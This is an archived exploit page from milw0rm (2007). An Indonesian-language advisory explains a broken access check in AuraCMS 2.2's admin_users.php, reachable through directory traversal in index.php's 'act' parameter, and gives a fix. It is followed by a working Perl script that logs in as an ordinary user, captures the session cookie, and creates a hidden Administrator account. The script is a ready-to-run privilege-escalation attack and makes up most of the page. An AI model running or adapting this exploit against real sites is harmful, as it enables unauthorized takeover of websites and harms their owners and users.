<html><head><title>AuraCMS 2.2 (admin_users.php) Remote Add Administrator Exploit</title></head><pre>#!/usr/bin/perl
#
# Indonesian Newhack Security Advisory
# ------------------------------------
# AuraCMS 2.2 - (admin_users.php) Remote Add Administrator Exploit
# Waktu			:  Dec 25 2007 04:50AM
# Software		:  AuraCMS 2.2
# Vendor		:  http://www.auracms.org/
# Ditemukan oleh	:  k1tk4t  |  http://newhack.org
# Lokasi		:  Indonesia
# Penjelasan		:
# 
# Kutu pada berkas &quot;admin_users.php&quot;
# coba kita lihat ;
# 01. &lt;?
# 02. if(ereg(basename (__FILE__), $_SERVER['PHP_SELF']))
# 03. {
# 04. 	header(&quot;HTTP/1.1 404 Not Found&quot;);
# 05.	exit;
# 06. }
# ---//---
# 12. if (!cek_login()){
# 13.    header(&quot;location: index.php&quot;);
# 14.   exit;
# 15. } else{
# ---//----
# Ada yang menarik pada berkas &quot;admin_users.php&quot;, pada baris 02 - 06 sebenarnya berkas ini sudah cukup aman
# karena jika berkas ini dipanggil langsung dari browser [http://target.com/admin/admin_users.php] akan menjawab Not Found dan Keluar
# mmm....!!! coba perhatikan baris 12 - 15, jika &quot;cek_login()&quot; maka akan meneruskan ke perintah2 berikutnya. 
# Disinilah kita mencoba 'bermain'  ;) 
# fungsi &quot;cek_login()&quot; ini hanya mengecek status login melalui session cookie, dengan semua level login [user,editor,administrator]
# Sehingga &quot;admin_users.php&quot; dapat di akses oleh user dengan level apa saja[tidak untuk TAMU],
#
# =&gt; Lantas Bagaimana Mengaksesnya, bukankah berkas &quot;admin_users.php&quot; tidak bisa dipanggil langsung [Baris 02 - 06] ?
# yup benar  ;)  &quot;admin_users.php&quot; tidak bisa di panggil langsung melalui browser, sekarang coba kita lihat pada berkas &quot;index.php&quot; ;
# ---//---
# 71. if(!isset($_GET['pilih'])){
# 72. include 'content/normal.php';
# 73. }else if (@$_GET['mod'] == 'yes' &amp;&amp; file_exists('mod/'.@$_GET['pilih'].'/'.@$_GET['pilih'].'.php') &amp;&amp; !isset($_GET['act']) &amp;&amp; !preg_match(&quot;/\.\./&quot;,$_GET['pilih'])) {
# 74. include 'mod/'.$_GET['pilih'].'/'.$_GET['pilih'].'.php';
# 75. }else if (@$_GET['mod'] == 'yes' &amp;&amp; file_exists('mod/'.@$_GET['pilih'].'/'.@$_GET['act'].'.php') &amp;&amp; !preg_match(&quot;/\.\./&quot;,$_GET['pilih'])) {
# 76. include 'mod/'.@$_GET['pilih'].'/'.@$_GET['act'].'.php';
# 77. }else if(!isset($_GET['mod']) &amp;&amp; !isset($_GET['act']) &amp;&amp; file_exists('content/'.$_GET['pilih'].'.php') &amp;&amp; !preg_match(&quot;/\.\./&quot;,$_GET['pilih'])) {
# 78. include 'content/'.$_GET['pilih'].'.php';	
# 79. }else {
# 80. header(&quot;location: index.php&quot;);
# 81. exit;	
# 82. } 
# ---//---
# mm... perhatikan kode2 tersebut... menarik bukan?
# iya dengan berkas &quot;index.php&quot; inilah kita bisa mengakses &quot;admin_users.php&quot; atau dengan kata lain mematahkan baris 02 - 06 pada berkas &quot;admin_users.php&quot;,
# 
# =&gt; Ooo Gitu..., terus memperbaikinya gmana ?
# hehehe...
# coba ganti baris 02 - 06 pada berkas &quot;admin_users.php&quot; dengan ;
# ---//---
# 02. if (!defined('AURACMS_admin')) {
# 03.	Header(&quot;Location: ../index.php&quot;);
# 04.	exit;
# 04. }
# ---//--
# Sebenarnya code tersebut sudah ada pada berkas2 admin lainnya, terkecuali pada berkas ;
# &quot;admin_users.php&quot;
# &quot;admin_poll.php&quot;
# &quot;admin_kalender.php&quot;
#
# =&gt; Ada apa lagi ?
# Exploit ini dibuat untuk pengetesan belaka, bukan untuk kegiatan terlarang
# saya[k1tk4t] dan &quot;Indonesian Newhack Technology&quot; tidak bertanggung jawab akan kerusakan yang diakibatkan dari penyalahgunaan exploit pada site     
#
# =&gt;
# Terima Kasih untuk;
# -[opt1lc, fl3xu5, ghoz]-
# str0ke, DNX, xoron, cyb3rh3b, K-159, the_hydra, y3dips
# nyubi,iFX,sin~X,k1n9k0ng,bius,selikoer,aldy_BT
# Komunitas Security dan Hacker Indonesia
#
# ----------------------------[Mulai]------------------------------------
use IO::Socket;

if(!$ARGV[4])
{
 print &quot;\n  |--------------------------------------------------------|&quot;;
 print &quot;\n  |             Indonesian Newhack Technology              |&quot;;
 print &quot;\n  |--------------------------------------------------------|&quot;;
 print &quot;\n  |AuraCMS 2.2 - (admin_users.php) Remote Add Admin Exploit|&quot;;
 print &quot;\n  |                   Coded by k1tk4t                      |&quot;;
 print &quot;\n  |--------------------------------------------------------|&quot;;
 print &quot;\n[!] &quot;;
 print &quot;\n[!] Buat Account terlebih dahulu pada site target dan pastikan Account tesebut bisa digunakan&quot;;
 print &quot;\n[!] Username dan Password tadi akan digunakan untuk membuat Account admin dengan exploit ini&quot;;
 print &quot;\n[!] Penggunaan : perl auracms22.pl [Site] [Path] [Port] [Username] [Password] &quot;;
 print &quot;\n[!] Contoh     : perl auracms22.pl target.com /auracms2.2/ 80 bugtest 123456&quot;;
 print &quot;\n[!] &quot;;
 print &quot;\n&quot;;
 exit;
}

$oriserver = $ARGV[0];
$orihost   = &quot;http://&quot;.$oriserver;
$oridir    = $ARGV[1];
$oriport   = $ARGV[2];
$oriuser   = $ARGV[3];
$oripass   = $ARGV[4];

  #Sending data...
  print &quot;- Melakukan Koneksi $orihost$oridir\r\n\r\n&quot;;
  logindulu();

sub logindulu ()
{
  $ldberkas  = &quot;index.php&quot;;
  $ldlengkap  = $oridir.$ldberkas;
  $lddata = &quot;username=&quot;.$oriuser;
  $lddata.= &quot;&amp;password=&quot;.$oripass;
  $lddata.= &quot;&amp;loguser=1&quot;;
  $lddata.= &quot;&amp;submit_login=Login&quot;;
  $lddatajml = length($lddata);
  $ldkonek =  IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$oriserver&quot;, PeerPort =&gt; &quot;$oriport&quot;) || die &quot;- Connection failed...\r\n&quot;;
  print $ldkonek &quot;POST $ldlengkap HTTP/1.1\n&quot;;
  print $ldkonek &quot;Accept: */*\r\n&quot;;
  print $ldkonek &quot;Referer: $orihost\r\n&quot;;
  print $ldkonek &quot;Accept-Language: en-us,en;q=0.5\r\n&quot;;
  print $ldkonek &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
  print $ldkonek &quot;User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11\r\n&quot;;
  print $ldkonek &quot;Host: $oriserver\r\n&quot;;
  print $ldkonek &quot;Content-length: $lddatajml\r\n&quot;;
  print $ldkonek &quot;Connection: Keep-Alive\r\n&quot;;
  print $ldkonek &quot;Cache-Control: no-cache\r\n\r\n&quot;;
  print $ldkonek $lddata;
  print $ldkonek &quot;\r\n\r\n&quot;;
  while ($hasil = &lt;$ldkonek&gt;) {
    if ($hasil =~ /Set-Cookie: (.*?) path=\//) { $ldkonekcookie = $ldkonekcookie.$1; }
    if ($hasil =~ /&lt;b&gt;$oriuser&lt;\/b&gt;/) { buatadmin(); }
   }
   die &quot;- Gagal Login\r\n&quot;;
}
sub buatadmin ()
{
  close ($ldkonek);
  print &quot;- Membuat User t4mugel4p dengan level Administrator\r\n\r\n&quot;;
  $baberkas  = &quot;index.php?pilih=news&amp;act=../../admin/admin_users&amp;mod=yes&amp;aksi=add&quot;;
  $balengkap  = $oridir.$baberkas;
  $badata = &quot;user=t4mugel4p&quot;;
  $badata.= &quot;&amp;password=t4mugel4p&quot;;
  $badata.= &quot;&amp;email=t4mugel4p%40gelapbanget.gitu&quot;;
  $badata.= &quot;&amp;level=Administrator&quot;;
  $badata.= &quot;&amp;tipe=aktif&quot;;
  $badata.= &quot;&amp;add_users=Add&quot;;
  $badatajml = length($badata);
  $bakonek =  IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$oriserver&quot;, PeerPort =&gt; &quot;$oriport&quot;) || die &quot;- Connection failed...\r\n&quot;;
  print $bakonek &quot;POST $balengkap HTTP/1.1\r\n&quot;;
  print $bakonek &quot;Accept: */*\r\n&quot;;
  print $bakonek &quot;Referer: $orihost.$balengkap\r\n&quot;;
  print $bakonek &quot;Accept-Language: en-us,en;q=0.5\r\n&quot;;
  print $bakonek &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
  print $bakonek &quot;User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11\r\n&quot;;
  print $bakonek &quot;Cookie: $ldkonekcookie\r\n&quot;;
  print $bakonek &quot;Host: $oriserver\r\n&quot;;
  print $bakonek &quot;Content-length: $badatajml\r\n&quot;;
  print $bakonek &quot;Connection: Keep-Alive\r\n&quot;;
  print $bakonek &quot;Cache-Control: no-cache\r\n\r\n&quot;;
  print $bakonek $badata;
  print $bakonek &quot;\r\n\r\n&quot;;
  while ($hasil = &lt;$bakonek&gt;) {
    if ($hasil =~ /Data Berhasil Di add/) {
      print &quot;- Exploiting Selesai dan SUKSES !!!\r\n\r\n&quot;;
      print &quot;- Login admin menggunakan\r\n&quot; ;
      print &quot;- Username : t4mugel4p\r\n&quot;; 
      print &quot;- Password : t4mugel4p\r\n\r\n&quot;;
      print &quot;- Pada site $orihost$ldlengkap\r\n&quot;;
      exit();
    }
    if ($hasil =~ /(Data Berhasil Di add)/) {
      print &quot;- Exploit Gagal\r\n&quot;;
      exit();
    }
  }
  die &quot;- Exploit Gagal\r\n&quot;;
}

# milw0rm.com [2007-12-25]</pre></html>